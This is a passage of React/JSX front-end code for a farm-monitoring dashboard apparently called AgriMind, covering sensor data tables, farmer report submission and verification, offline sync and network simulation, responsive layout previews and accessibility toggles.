                            <td className="py-3"><span className="px-2 py-0.5 bg-emerald-100 text-emerald-800 text-[8px] font-bold uppercase rounded">🟢 Verified</span></td>
                            <td className="py-3 text-slate-400">Botolan Field Probe #042</td>
                            <td className="py-3 text-right text-slate-400">Just now</td>
                          </tr>
                        )}
                        {/* Record 2 */}
                        {(selectedStatusTagFilter === "all" || selectedStatusTagFilter === "estimated") && (
                          <tr>
                            <td className="py-3 font-bold text-slate-900 dark:text-white">Aggregate Nitrogen Index</td>
                            <td className="py-3 font-mono">145 ppm (Nitrate equivalence)</td>
                            <td className="py-3"><span className="px-2 py-0.5 bg-amber-100 text-amber-800 text-[8px] font-bold uppercase rounded">🟡 Estimated</span></td>
                            <td className="py-3 text-slate-400">Spatial soil moisture calculation mapping</td>
                            <td className="py-3 text-right text-slate-400">1.5 hours ago</td>
                          </tr>
                        )}
                        {/* Record 3 */}
                        {(selectedStatusTagFilter === "all" || selectedStatusTagFilter === "forecast") && (
                          <tr>
                            <td className="py-3 font-bold text-slate-900 dark:text-white">Precipitation Quantity</td>
                            <td className="py-3 font-mono">12.4 mm accumulative</td>
                            <td className="py-3"><span className="px-2 py-0.5 bg-blue-100 text-blue-800 text-[8px] font-bold uppercase rounded">🔵 Forecast</span></td>
                            <td className="py-3 text-slate-400">PAGASA Weather radar numerical model</td>
                            <td className="py-3 text-right text-slate-400">0.5 hours ago</td>
                          </tr>
                        )}
                        {/* Record 4 */}
                        {(selectedStatusTagFilter === "all" || selectedStatusTagFilter === "ai_recommendation") && (
                          <tr>
                            <td className="py-3 font-bold text-slate-900 dark:text-white">Pest Outbreak Alert</td>
                            <td className="py-3 font-mono">Moderate Armyworm mitigation step</td>
                            <td className="py-3"><span className="px-2 py-0.5 bg-purple-100 text-purple-800 text-[8px] font-bold uppercase rounded">🟣 AI Recommendation</span></td>
                            <td className="py-3 text-slate-400">Gemini 2.5 crop image evaluation node</td>
                            <td className="py-3 text-right text-slate-400">45 mins ago</td>
                          </tr>
                        )}
                        {/* Record 5 */}
                        {(selectedStatusTagFilter === "all" || selectedStatusTagFilter === "historical") && (
                          <tr>
                            <td className="py-3 font-bold text-slate-900 dark:text-white">Dry Season Crop Yield</td>
                            <td className="py-3 font-mono">4.8 tons per hectare avg</td>
                            <td className="py-3"><span className="px-2 py-0.5 bg-slate-100 text-slate-600 text-[8px] font-bold uppercase rounded">⚪ Historical</span></td>
                            <td className="py-3 text-slate-400">Zambales 2025 agricultural yearbook</td>
                            <td className="py-3 text-right text-slate-400">Static ledger</td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>

              {/* SECTION 4: User-Submitted Data Pipeline Tracker */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                {/* Left Column: quick submit form */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">5. Submit Farmer Field Report</span>
                    <p className="text-[10px] text-slate-500 font-semibold">
                      Farmers can report on-ground soil or pest sightings. These undergo a 4-tier verification protocol before publication.
                    </p>
                  </div>

                  <form onSubmit={handleCreateSubmission} className="space-y-3.5 bg-white dark:bg-slate-900 p-4 rounded-2xl border border-slate-200 dark:border-white/5">
                    <div>
                      <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Farmer Name</label>
                      <input 
                        type="text" 
                        value={newSubFarmer}
                        onChange={(e) => setNewSubFarmer(e.target.value)}
                        className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Official Barangay</label>
                        <select 
                          value={newSubBarangay}
                          onChange={(e) => setNewSubBarangay(e.target.value)}
                          className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                        >
                          <option value="Poblacion">Poblacion</option>
                          <option value="Carael">Carael</option>
                          <option value="Batonlapoc">Batonlapoc</option>
                          <option value="Loob Bunga">Loob Bunga</option>
                        </select>
                      </div>
                      <div>
                        <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Report Category</label>
                        <select 
                          value={newSubCategory}
                          onChange={(e) => setNewSubCategory(e.target.value)}
                          className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                        >
                          <option value="Soil Moisture Reading">Soil Probe</option>
                          <option value="Pest Sighting: Rice Blast">Pest sighting</option>
                          <option value="Harvest Yield">Harvest Yield</option>
                        </select>
                      </div>
                    </div>

                    <div>
                      <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Value / Observations</label>
                      <input 
                        type="text" 
                        value={newSubValue}
                        onChange={(e) => setNewSubValue(e.target.value)}
                        placeholder="e.g. 35% soil moisture"
                        className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                        required
                      />
                    </div>

                    <button
                      type="submit"
                      className="w-full py-2.5 bg-slate-900 hover:bg-slate-850 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase rounded-xl transition-all cursor-pointer"
                    >
                      File Report & Initiate Pipeline
                    </button>
                  </form>
                </div>

                {/* Right 2 Columns: User Submission active list and verification timeline controls */}
                <div className="lg:col-span-2 p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">6. Active Farmer Submission Pipeline Queue</span>
                    <p className="text-[10px] text-slate-500 font-semibold">
                      Municipal Agricultural Officers review and sign submitted reports. Once verified, reports are published to the public dashboards and analytical ledgers.
                    </p>
                  </div>

                  <div className="space-y-3">
                    {userSubmissions.map(s => (
                      <div key={s.id} className="p-4 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-2xl space-y-3">
                        <div className="flex items-center justify-between flex-wrap gap-2">
                          <div>
                            <span className="text-[8px] font-black uppercase text-slate-400">FARMER: {s.farmer} ({s.barangay})</span>
                            <h4 className="font-extrabold text-[11px] text-slate-800 dark:text-white mt-0.5">{s.category}</h4>
                          </div>

                          <div className="flex items-center gap-2">
                            {/* Pipeline timeline display status */}
                            <span className={`px-2 py-0.5 text-[8px] font-bold uppercase rounded ${
                              s.status === "Pending Review" 
                                ? "bg-amber-100 text-amber-800" 
                                : s.status === "Verified" 
                                  ? "bg-cyan-100 text-cyan-800" 
                                  : "bg-emerald-100 text-emerald-800"
                            }`}>
                              {s.status}
                            </span>
                          </div>
                        </div>

                        <div className="p-2.5 bg-slate-50 dark:bg-slate-950/40 rounded-xl font-mono text-[9px] text-slate-600 dark:text-slate-300 flex justify-between items-center">
                          <span>Reported Content: <span className="text-slate-900 dark:text-white font-bold">{s.value}</span></span>
                          <span className="text-[8px] text-slate-400">{s.timestamp}</span>
                        </div>

                        <div className="flex items-center justify-between pt-1 border-t border-slate-50 dark:border-white/5">
                          {s.verifiedBy ? (
                            <span className="text-[8px] font-semibold text-slate-400">Signed & Certified: <span className="text-cyan-500 font-bold">{s.verifiedBy}</span></span>
                          ) : (
                            <span className="text-[8px] font-semibold text-slate-400">Awaiting Agricultural Officer's signature</span>
                          )}

                          <div className="flex gap-2">
                            {s.status === "Pending Review" && (
                              <button
                                onClick={() => handleVerifySubmission(s.id)}
                                className="px-2.5 py-1 bg-cyan-600 hover:bg-cyan-700 text-white text-[8px] font-black uppercase rounded cursor-pointer transition-colors"
                              >
                                Review & Verify
                              </button>
                            )}
                            {s.status === "Verified" && (
                              <button
                                onClick={() => handlePublishSubmission(s.id)}
                                className="px-2.5 py-1 bg-emerald-600 hover:bg-emerald-700 text-white text-[8px] font-black uppercase rounded cursor-pointer transition-colors"
                              >
                                Publish to Master DB
                              </button>
                            )}
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* SECTION 5: Real-time Data Integrity Scanners Terminal */}
              <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">7. Core Data Integrity Scanners & Monitor</span>
                
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                  {/* Left Column: KPIs */}
                  <div className="space-y-3">
                    <span className="text-[9px] font-black uppercase text-slate-400 block">Sourcing Quality KPIs</span>
                    <div className="space-y-2 text-[10px] font-semibold">
                      <div className="flex justify-between items-center p-2.5 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span className="text-slate-500">Verified Database Records:</span>
                        <span className="text-emerald-500 font-black font-mono">78.2%</span>
                      </div>
                      <div className="flex justify-between items-center p-2.5 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span className="text-slate-500">Missing Telemetry Fields:</span>
                        <span className="text-amber-500 font-black font-mono">4 points</span>
                      </div>
                      <div className="flex justify-between items-center p-2.5 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span className="text-slate-500">Outdated Records (&gt; 2h):</span>
                        <span className="text-slate-500 font-black font-mono">5 items</span>
                      </div>
                      <div className="flex justify-between items-center p-2.5 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl">
                        <span className="text-slate-500">Average Telemetry Age:</span>
                        <span className="text-cyan-500 font-black font-mono">1.2 hours</span>
                      </div>
                    </div>

                    <button
                      onClick={handleRunIntegrityCrossCheck}
                      disabled={isCheckingIntegrity}
                      className="w-full py-3 bg-slate-900 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase rounded-xl transition-all disabled:opacity-50 cursor-pointer"
                    >
                      {isCheckingIntegrity ? "Analyzing Datasets..." : "Run Multi-source Integrity Cross-Check"}
                    </button>
                  </div>

                  {/* Right 2 Columns: Terminal Monitor */}
                  <div className="lg:col-span-2 bg-slate-950 p-5 rounded-2xl border border-slate-800 text-white font-mono text-[9px] leading-relaxed flex flex-col justify-between min-h-[180px]">
                    <div className="space-y-1">
                      <div className="flex items-center justify-between border-b border-slate-800 pb-1.5 mb-1.5">
                        <span className="text-[8px] font-black text-cyan-400 uppercase">Integrity Monitor Terminal Console</span>
                        <span className="text-[7px] text-slate-500">STDOUT / PROVENANCE_REVIEWS</span>
                      </div>
                      
                      <div className="space-y-1 max-h-[140px] overflow-y-auto">
                        {verificationTerminalLog.map((logLine, index) => (
                          <div key={index} className={
                            logLine.startsWith("✓") 
                              ? "text-emerald-400" 
                              : logLine.startsWith("⚠️") 
                                ? "text-amber-400" 
                                : logLine.startsWith("🟢") 
                                  ? "text-cyan-400 font-bold" 
                                  : "text-slate-300"
                          }>
                            {logLine}
                          </div>
                        ))}
                      </div>
                    </div>

                    <div className="flex justify-between items-center text-[8px] text-slate-500 border-t border-slate-800 pt-2 mt-2">
                      <span>Authority Validation: SECURE_LEDGER_OK</span>
                      <span>Relational integrity: COMPLIANT</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB: MASTER COMPATIBILITY & PROGRESSIVE ENHANCEMENT HUB */}
          {activeSubTab === "compatibility" && (
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-8 animate-fade-in">
              {/* Header */}
              <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-4 flex-wrap gap-4">
                <div className="space-y-1">
                  <h3 className="text-sm font-black uppercase text-slate-900 dark:text-white tracking-wider flex items-center gap-2">
                    <Globe className="w-4 h-4 text-pink-500 animate-pulse" />
                    AgriMind AI System Compatibility & Progressive Suite (v1.0)
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">
                    Ensure seamless cross-platform delivery under intermittent network conditions, modular pluggable AI providers, PWA shortcuts, and strict WCAG 2.2 AA accessibility filters.
                  </p>
                </div>
                <div className="flex items-center gap-1.5 px-3 py-1 bg-pink-50 dark:bg-pink-950/30 border border-pink-100 dark:border-pink-900/30 rounded-xl text-[10px] font-bold text-pink-600 dark:text-pink-400">
                  <span className="w-1.5 h-1.5 bg-pink-500 rounded-full animate-ping" />
                  <span>Resilient Offline-Sync Core Active</span>
                </div>
              </div>

              {/* BONUS SUGGESTION: System Compatibility Checklist Ledger */}
              <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                <div className="flex justify-between items-center flex-wrap gap-2">
                  <span className="text-[10px] font-black uppercase text-pink-600 dark:text-pink-400 tracking-wider block">⭐ Official Platform Compatibility Matrix</span>
                  <span className="text-[8px] font-bold text-slate-400">WCAG 2.2 AA Compliant & Multi-Device Standard</span>
                </div>
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
                  {[
                    { label: "Google Chrome", desc: "Verified Desktop/Mobile", supported: true },
                    { label: "Microsoft Edge", desc: "Blink Chromium Engine", supported: true },
                    { label: "Mozilla Firefox", desc: "Gecko Standard Engine", supported: true },
                    { label: "Safari (Mac/iOS)", desc: "WebKit Engine Native", supported: true },
                    { label: "Android Devices", desc: "Chrome & WebView Native", supported: true },
                    { label: "iPhones & iPads", desc: "Mobile Safari Native", supported: true },
                    { label: "Windows OS", desc: "System Shell Compatible", supported: true },
                    { label: "macOS & Linux", desc: "Unix Web Sandbox Native", supported: true },
                    { label: "PWA Installable", desc: "W3C Manifest Compliant", supported: true },
                    { label: "Offline Mode Ready", desc: "IndexedDB Failsafe Store", supported: true },
                    { label: "Responsive Layout", desc: "320px to 4K Ultrawide Fluid", supported: true },
                    { label: "WCAG 2.2 AA", desc: "Keyboard Focus & Contrast OK", supported: true }
                  ].map((item, idx) => (
                    <div key={idx} className="p-3 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-2xl flex items-start gap-2.5">
                      <div className="mt-0.5 p-0.5 bg-emerald-50 dark:bg-emerald-950/50 rounded-full text-emerald-500">
                        <Check className="w-3 h-3 font-extrabold" />
                      </div>
                      <div>
                        <h4 className="text-[10px] font-black text-slate-800 dark:text-white leading-tight">{item.label}</h4>
                        <span className="text-[8px] text-slate-400 font-medium block">{item.desc}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* TWO COLUMN GRID: Admin Compatibility Dashboard & Network Speed Controller */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                {/* Left Column: Admin Compatibility Dashboard Usage Metrics */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">📊 Admin Compatibility & Telemetry Logs</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      Real-time aggregate usage statistics gathered anonymously from active regional farm operators in Botolan, Zambales.
                    </p>
                  </div>

                  <div className="space-y-3">
                    {/* Browser & OS Share */}
                    <div className="bg-white dark:bg-slate-900 p-3.5 border border-slate-150 dark:border-white/5 rounded-2xl space-y-2.5">
                      <span className="text-[8px] font-black uppercase text-slate-400 tracking-wider block">Browser & OS Footprint</span>
                      
                      <div className="space-y-2">
                        <div>
                          <div className="flex justify-between items-center text-[9px] font-bold mb-1 text-slate-600 dark:text-slate-300">
                            <span>Chrome / Android WebView</span>
                            <span className="font-mono">72.4%</span>
                          </div>
                          <div className="w-full bg-slate-100 dark:bg-slate-850 h-1.5 rounded-full overflow-hidden">
                            <div className="bg-emerald-500 h-full rounded-full" style={{ width: "72.4%" }} />
                          </div>
                        </div>

                        <div>
                          <div className="flex justify-between items-center text-[9px] font-bold mb-1 text-slate-600 dark:text-slate-300">
                            <span>Mobile Safari (iOS)</span>
                            <span className="font-mono">18.1%</span>
                          </div>
                          <div className="w-full bg-slate-100 dark:bg-slate-850 h-1.5 rounded-full overflow-hidden">
                            <div className="bg-cyan-500 h-full rounded-full" style={{ width: "18.1%" }} />
                          </div>
                        </div>

                        <div>
                          <div className="flex justify-between items-center text-[9px] font-bold mb-1 text-slate-600 dark:text-slate-300">
                            <span>Edge & Firefox Desktop</span>
                            <span className="font-mono">9.5%</span>
                          </div>
                          <div className="w-full bg-slate-100 dark:bg-slate-850 h-1.5 rounded-full overflow-hidden">
                            <div className="bg-pink-500 h-full rounded-full" style={{ width: "9.5%" }} />
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Device & Resolution Share */}
                    <div className="bg-white dark:bg-slate-900 p-3.5 border border-slate-150 dark:border-white/5 rounded-2xl space-y-2.5">
                      <span className="text-[8px] font-black uppercase text-slate-400 tracking-wider block">Active Devices & Breakpoints</span>
                      
                      <div className="space-y-1.5 text-[9px] font-semibold text-slate-600 dark:text-slate-300">
                        <div className="flex justify-between items-center py-1 border-b border-slate-50 dark:border-white/5">
                          <span>📱 Android Phones (&lt; 480px)</span>
                          <span className="font-mono text-slate-800 dark:text-white font-extrabold">64.0%</span>
                        </div>
                        <div className="flex justify-between items-center py-1 border-b border-slate-50 dark:border-white/5">
                          <span>💻 Laptops / Desktops (1024px+)</span>
                          <span className="font-mono text-slate-800 dark:text-white font-extrabold">26.2%</span>
                        </div>
                        <div className="flex justify-between items-center py-1 border-b border-slate-50 dark:border-white/5">
                          <span>📱 Tablets & iPads (768px+)</span>
                          <span className="font-mono text-slate-800 dark:text-white font-extrabold">9.8%</span>
                        </div>
                      </div>
                    </div>

                    {/* PWA & Offline Sync Stats */}
                    <div className="bg-white dark:bg-slate-900 p-3.5 border border-slate-150 dark:border-white/5 rounded-2xl space-y-2.5">
                      <span className="text-[8px] font-black uppercase text-slate-400 tracking-wider block">PWA & Offline Resilience Usage</span>
                      
                      <div className="grid grid-cols-2 gap-2 text-center">
                        <div className="p-2 bg-slate-50 dark:bg-slate-950/50 rounded-xl">
                          <span className="text-[8px] font-bold text-slate-400 block uppercase">PWA Installs</span>
                          <span className="text-sm font-black text-pink-500 font-mono">82%</span>
                        </div>
                        <div className="p-2 bg-slate-50 dark:bg-slate-950/50 rounded-xl">
                          <span className="text-[8px] font-bold text-slate-400 block uppercase">Offline Syncs</span>
                          <span className="text-sm font-black text-cyan-500 font-mono">1,452 runs</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Right 2 Columns: Interactive Network Simulation and PWA offline queue */}
                <div className="lg:col-span-2 p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-6">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-cyan-600 dark:text-cyan-400 tracking-wider block">2. Environment Failsafe & Network Throttling Simulator</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      Simulate extreme network latencies to experience how AgriMind behaves under slow mobile 3G signals or complete signal dropouts in isolated farms.
                    </p>
                  </div>

                  {/* Network selection controls */}
                  <div className="bg-white dark:bg-slate-900 p-5 rounded-2xl border border-slate-150 dark:border-white/5 space-y-4">
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                      {[
                        { id: "high-speed", label: "High-Speed Fiber", speed: "100+ Mbps", latency: "12ms", desc: "Municipal Hubs" },
                        { id: "mobile-4g", label: "Mobile 4G/5G", speed: "15-30 Mbps", latency: "35ms", desc: "Poblacion Centers" },
                        { id: "slow-3g", label: "Intermittent 3G", speed: "150-300 Kbps", latency: "380ms", desc: "Remote Fields" },
                        { id: "offline", label: "Complete Offline", speed: "0.0 Kbps", latency: "∞ ms", desc: "Zero Connectivity" }
                      ].map((net) => {
                        const isSelected = selectedNetworkSpeed === net.id;
                        return (
                          <button
                            key={net.id}
                            type="button"
                            onClick={() => {
                              setSelectedNetworkSpeed(net.id as any);
                              addLog("Network Throttle Switched", net.id === "offline" ? "warning" : "info", "ClientLink", `Simulating network throttle constraint: ${net.label} (${net.speed}, latency: ${net.latency})`);
                            }}
                            className={`p-3 text-left rounded-xl transition-all border cursor-pointer ${
                              isSelected 
                                ? "bg-slate-900 border-slate-900 text-white dark:bg-cyan-600 dark:border-cyan-500" 
                                : "bg-slate-50 dark:bg-slate-950 border-slate-150 dark:border-white/5 text-slate-700 hover:bg-slate-100 dark:text-slate-300"
                            }`}
                          >
                            <div className="flex items-center justify-between">
                              <span className="text-[9px] font-black block uppercase">{net.label}</span>
                              <Wifi className={`w-3.5 h-3.5 ${isSelected ? "text-cyan-300" : "text-slate-400"}`} />
                            </div>
                            <span className="text-[10px] font-bold font-mono block mt-1">{net.speed}</span>
                            <div className="flex justify-between items-center text-[7px] text-slate-400 mt-1">
                              <span>Lat: {net.latency}</span>
                              <span>{net.desc}</span>
                            </div>
                          </button>
                        );
                      })}
                    </div>

                    {/* Network state feedback card */}
                    <div className="p-4 bg-slate-50 dark:bg-slate-950 rounded-xl flex items-center justify-between flex-wrap gap-4 border border-slate-150 dark:border-white/5">
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <span className={`w-2 h-2 rounded-full ${
                            selectedNetworkSpeed === "high-speed" 
                              ? "bg-emerald-500" 
                              : selectedNetworkSpeed === "mobile-4g" 
                                ? "bg-cyan-500" 
                                : selectedNetworkSpeed === "slow-3g" 
                                  ? "bg-amber-500 animate-pulse" 
                                  : "bg-rose-500 animate-ping"
                          }`} />
                          <span className="text-[10px] font-black uppercase text-slate-800 dark:text-white">
                            Status: {selectedNetworkSpeed === "offline" ? "Offline Mode Engaged" : "Signal Synchronized"}
                          </span>
                        </div>
                        <p className="text-[9px] text-slate-400 font-semibold max-w-md">
                          {selectedNetworkSpeed === "offline" 
                            ? "All crop data edits, photos, and soil entries will queue locally inside IndexedDB. Background sync activates immediately upon reconnection." 
                            : "Standard real-time transmission mode. Directly streaming metadata payloads to relational backend servers."
                          }
                        </p>
                      </div>

                      <div className="flex items-center gap-2">
                        {/* Queue controls */}
                        <div className="text-right">
                          <span className="text-[8px] font-bold text-slate-400 block uppercase">Local Queue</span>
                          <span className="text-xs font-black text-slate-900 dark:text-white font-mono">{compatPwaSyncQueue} Actions</span>
                        </div>

                        {selectedNetworkSpeed === "offline" ? (
                          <button
                            type="button"
                            onClick={handleSimulateOfflineSync}
                            className="px-3 py-1.5 bg-rose-600 hover:bg-rose-700 text-white text-[9px] font-black uppercase rounded-lg transition-colors cursor-pointer border-0"
                          >
                            Queue Offline Edit
                          </button>
                        ) : (
                          <button
                            type="button"
                            onClick={handleSyncOfflineData}
                            disabled={compatPwaSyncQueue === 0}
                            className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white text-[9px] font-black uppercase rounded-lg transition-colors disabled:opacity-40 cursor-pointer border-0"
                          >
                            Synchronize Queue
                          </button>
                        )}
                      </div>
                    </div>

                    {/* Progressive App Shell/PWA controller */}
                    <div className="flex justify-between items-center flex-wrap gap-4 border-t border-slate-100 dark:border-white/5 pt-4">
                      <div className="space-y-0.5">
                        <span className="text-[9px] font-black text-slate-400 block uppercase">PWA Manifest & Service Worker Cache</span>
                        <p className="text-[9px] text-slate-500 font-semibold">
                          Pins a dedicated shortcut to your home screen or desktop, enabling full offline access without App Store requirements.
                        </p>
                      </div>

                      <button
                        type="button"
                        onClick={handleTogglePwaInstall}
                        className={`px-4 py-2 text-[10px] font-black uppercase rounded-xl transition-all cursor-pointer border-0 ${
                          compatPwaInstalled 
                            ? "bg-slate-200 text-slate-800 dark:bg-slate-800 dark:text-slate-200" 
                            : "bg-pink-600 hover:bg-pink-700 text-white"
                        }`}
                      >
                        {compatPwaInstalled ? "✓ PWA Installed (Click to Remove)" : "Install AgriMind to Home Screen"}
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              {/* THREE COLUMN GRID: Device Screen Breakpoint Sandbox, Accessibility Filter, and File Sandbox */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                
                {/* Left Column: RESPONSIVE COMPATIBILITY SANDBOX */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">3. Responsive Breakpoint Viewport Simulator</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      Test liquid container adaptability from small smartphones to 4K ultrawide displays. See how layout stacks automatically to prevent horizontal scrolls.
                    </p>
                  </div>

                  {/* Width selectors */}
                  <div className="grid grid-cols-4 gap-1">
                    {[
                      { id: "mobile", width: "320px", label: "320px Mobile" },
                      { id: "tablet", width: "768px", label: "768px Tablet" },
                      { id: "desktop", width: "1280px", label: "1280px Laptop" },
                      { id: "ultrawide", width: "1920px+", label: "4K Screen" }
                    ].map((bp) => {
                      const isSelected = selectedDeviceMode === bp.id;
                      return (
                        <button
                          key={bp.id}
                          type="button"
                          onClick={() => setSelectedDeviceMode(bp.id as any)}
                          className={`py-1.5 px-1 text-[8px] font-black uppercase tracking-tight rounded-lg border text-center transition-all cursor-pointer ${
                            isSelected 
                              ? "bg-slate-900 border-slate-900 text-white dark:bg-cyan-600 dark:border-cyan-500" 
                              : "bg-white dark:bg-slate-900 border-slate-150 dark:border-white/5 text-slate-600 dark:text-slate-400"
                          }`}
                        >
                          {bp.id.toUpperCase()}
                          <span className="block text-[6px] font-mono opacity-80">{bp.width}</span>
                        </button>
                      );
                    })}
                  </div>

                  {/* Visual mockup of the app container */}
                  <div className="bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-2xl p-4 overflow-hidden relative">
                    <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-2 mb-2 text-[8px] font-black text-slate-400">
                      <span>Simulated Viewport ({selectedDeviceMode === "mobile" ? "320px" : selectedDeviceMode === "tablet" ? "768px" : selectedDeviceMode === "desktop" ? "1280px" : "1920px"})</span>
                      <span className="text-[7px] bg-emerald-50 text-emerald-600 px-1 rounded uppercase">Fluid Layout</span>
                    </div>

                    {/* Adapt container spacing mock according to state */}
                    <div className={`space-y-2 border border-dashed border-slate-200 dark:border-slate-800 p-2.5 rounded-xl mx-auto transition-all ${
                      selectedDeviceMode === "mobile" 
                        ? "max-w-[140px]" 
                        : selectedDeviceMode === "tablet" 
                          ? "max-w-[220px]" 
                          : "max-w-full"
                    }`}>
                      {/* Top Header Mockup */}
                      <div className={`flex gap-1.5 items-center justify-between ${selectedDeviceMode === "mobile" ? "flex-col text-center" : ""}`}>
                        <div className="flex items-center gap-1">
                          <div className="w-3.5 h-3.5 bg-pink-500 rounded-full shrink-0" />
                          <span className="text-[8px] font-black uppercase text-slate-900 dark:text-white">AgriMind</span>
                        </div>
                        <span className="text-[6px] font-bold text-slate-400 font-mono">Ver 1.0</span>
                      </div>

                      {/* Main visual elements layout */}
                      <div className={`grid gap-2 ${selectedDeviceMode === "mobile" ? "grid-cols-1" : "grid-cols-2"}`}>
                        <div className="p-2 bg-slate-50 dark:bg-slate-950 rounded-lg space-y-1">
                          <span className="text-[6px] font-bold text-slate-400 uppercase">Crop Sowing Map</span>
                          <div className="h-6 bg-emerald-100 dark:bg-emerald-950/40 rounded flex items-center justify-center text-[6px] font-bold text-emerald-600 font-mono">
                            Spatial Grid OK
                          </div>
                        </div>

                        <div className="p-2 bg-slate-50 dark:bg-slate-950 rounded-lg space-y-1">
                          <span className="text-[6px] font-bold text-slate-400 uppercase">Pest Warning</span>
                          <div className="h-6 bg-amber-100 dark:bg-amber-950/40 rounded flex items-center justify-center text-[6px] font-bold text-amber-700 font-mono">
                            Botolan Alert
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Center Column: WCAG 2.2 AA ACCESSIBILITY ASSISTIVE CONTROLS */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">4. Assistive Accessibility Filter Suite</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      Enable high contrast, limit animations for vestibular safety, or simulate colorblind vision challenges directly over our visualizers.
                    </p>
                  </div>

                  <div className="bg-white dark:bg-slate-900 p-4 border border-slate-150 dark:border-white/5 rounded-2xl space-y-3.5 text-[10px]">
                    {/* Contrast and motion toggles */}
                    <div className="space-y-2">
                      <label className="flex items-center justify-between font-bold text-slate-700 dark:text-slate-300">
                        <span>High Contrast Mode</span>
                        <input 
                          type="checkbox" 
                          checked={accessibilityHighContrast}
                          onChange={(e) => {
                            setAccessibilityHighContrast(e.target.checked);
                            addLog("High Contrast Mode Toggled", "info", "A11yEngine", `Set high contrast simulation: ${e.target.checked}`);
                          }}
                          className="rounded text-pink-600 w-3.5 h-3.5 cursor-pointer"
                        />
                      </label>

                      <label className="flex items-center justify-between font-bold text-slate-700 dark:text-slate-300">
                        <span>Reduced Motion (Disable Transitions)</span>
                        <input 
                          type="checkbox" 
                          checked={accessibilityReducedMotion}
                          onChange={(e) => {
                            setAccessibilityReducedMotion(e.target.checked);
                            addLog("Reduced Motion Toggled", "info", "A11yEngine", `Set reduced motion constraint: ${e.target.checked}`);
                          }}
                          className="rounded text-pink-600 w-3.5 h-3.5 cursor-pointer"
                        />
                      </label>

                      <label className="flex items-center justify-between font-bold text-slate-700 dark:text-slate-300">
                        <span>Visual ARIA Label Debug Overlay</span>
                        <input 
                          type="checkbox" 
                          checked={accessibilityShowAria}
                          onChange={(e) => {
                            setAccessibilityShowAria(e.target.checked);
